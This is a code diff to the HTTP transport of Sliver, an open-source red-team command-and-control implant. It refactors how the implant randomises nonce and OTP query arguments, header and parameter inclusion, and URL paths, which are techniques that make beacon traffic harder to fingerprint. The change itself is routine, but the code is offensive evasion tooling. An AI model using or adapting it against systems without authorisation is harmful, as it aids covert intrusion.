@@ -26,7 +26,6 @@ import (
 	"errors"
 	"fmt"
 	"io"
-	insecureRand "math/rand"
 	"net/http"
 	"net/url"
 	"path"
@@ -43,6 +42,7 @@ import (
 	"github.com/bishopfox/sliver/implant/sliver/cryptography"
 	"github.com/bishopfox/sliver/implant/sliver/encoders"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
+	"github.com/bishopfox/sliver/util"
 	"google.golang.org/protobuf/proto"
 )
 
@@ -200,9 +200,9 @@ func (s *SliverHTTPClient) SessionInit() error {
 // NonceQueryArgument - Adds a nonce query argument to the URL
 func (s *SliverHTTPClient) NonceQueryArgument(uri *url.URL, value uint64) *url.URL {
 	argValue := fmt.Sprintf("%d", value)
-	for i := 0; i < insecureRand.Intn(3); i++ {
-		index := insecureRand.Intn(len(argValue))
-		char := string(NonceQueryArgChars[insecureRand.Intn(len(NonceQueryArgChars))])
+	for i := 0; i < util.Intn(3); i++ {
+		index := util.Intn(len(argValue))
+		char := string(NonceQueryArgChars[util.Intn(len(NonceQueryArgChars))])
 		argValue = argValue[:index] + char + argValue[index:]
 	}
 
@@ -211,7 +211,7 @@ func (s *SliverHTTPClient) NonceQueryArgument(uri *url.URL, value uint64) *url.U
 		var key string
 		length, _ := strconv.Atoi(NonceQueryLength)
 		for i := 0; i < length; i++ {
-			key += string(NonceQueryArgChars[insecureRand.Intn(len(NonceQueryArgChars))])
+			key += string(NonceQueryArgChars[util.Intn(len(NonceQueryArgChars))])
 		}
 
 		values.Add(string(key), argValue)
@@ -220,7 +220,7 @@ func (s *SliverHTTPClient) NonceQueryArgument(uri *url.URL, value uint64) *url.U
 	} else {
 		segments := strings.Split(uri.Path, "/")
 		extension := path.Ext(segments[len(segments)-1])
-		index := insecureRand.Intn(len(segments))
+		index := util.Intn(len(segments))
 		segments[index] = argValue
 		if index == len(segments)-1 {
 			segments[index] += extension
@@ -233,11 +233,11 @@ func (s *SliverHTTPClient) NonceQueryArgument(uri *url.URL, value uint64) *url.U
 // OTPQueryArgument - Adds an OTP query argument to the URL
 func (s *SliverHTTPClient) OTPQueryArgument(uri *url.URL, value string) *url.URL {
 	values := uri.Query()
-	key1 := NonceQueryArgChars[insecureRand.Intn(len(NonceQueryArgChars))]
-	key2 := NonceQueryArgChars[insecureRand.Intn(len(NonceQueryArgChars))]
-	for i := 0; i < insecureRand.Intn(3); i++ {
-		index := insecureRand.Intn(len(value))
-		char := string(NonceQueryArgChars[insecureRand.Intn(len(NonceQueryArgChars))])
+	key1 := NonceQueryArgChars[util.Intn(len(NonceQueryArgChars))]
+	key2 := NonceQueryArgChars[util.Intn(len(NonceQueryArgChars))]
+	for i := 0; i < util.Intn(3); i++ {
+		index := util.Intn(len(value))
+		char := string(NonceQueryArgChars[util.Intn(len(NonceQueryArgChars))])
 		value = value[:index] + char + value[index:]
 	}
 	values.Add(string([]byte{key1, key2}), value)
@@ -284,7 +284,7 @@ func (s *SliverHTTPClient) newHTTPRequest(method string, uri *url.URL, body io.R
 		// {{end}}
 		probability, _ := strconv.Atoi(header.Probability)
 		if 0 < probability {
-			roll := insecureRand.Intn(99) + 1
+			roll := util.Intn(99) + 1
 			if probability < roll {
 				continue
 			}
@@ -309,7 +309,7 @@ func (s *SliverHTTPClient) newHTTPRequest(method string, uri *url.URL, body io.R
 		}
 		probability, _ := strconv.Atoi(param.Probability)
 		if 0 < probability {
-			roll := insecureRand.Intn(99) + 1
+			roll := util.Intn(99) + 1
 			if probability < roll {
 				continue
 			}
@@ -318,15 +318,6 @@ func (s *SliverHTTPClient) newHTTPRequest(method string, uri *url.URL, body io.R
 	}
 	req.URL.RawQuery = queryParams.Encode()
 	return req
-}
-
-func contains[T comparable](elements []T, v T) bool {
-	for _, s := range elements {
-		if v == s {
-			return true
-		}
-	}
-	return false
 }
 
 // Do - Wraps http.Client.Do with a context
@@ -646,14 +637,14 @@ func (s *SliverHTTPClient) randomPath(segments []string, filenames []string, ext
 	if 0 < len(segments) {
 		min, _ := strconv.Atoi("{{.HTTPC2ImplantConfig.MinPathLength}}")
 		max, _ := strconv.Atoi("{{.HTTPC2ImplantConfig.MaxPathLength}}")
-		n := insecureRand.Intn(max-min+1) + min // How many segments?
-		for index := 0; index < n; index++ {
-			seg := segments[insecureRand.Intn(len(segments))]
+		n := util.Intn(max-min+1) + min // How many segments?
+		for range n {
+			seg := segments[util.Intn(len(segments))]
 			genSegments = append(genSegments, seg)
 		}
 	}
-	filename := filenames[insecureRand.Intn(len(filenames))]
-	ext := exts[insecureRand.Intn(len(exts))]
+	filename := filenames[util.Intn(len(filenames))]
+	ext := exts[util.Intn(len(exts))]
 
 	// {{if .Config.Debug}}
 	log.Printf("[http] segments = %v, filename = %s, ext = %s", genSegments, filename, ext)
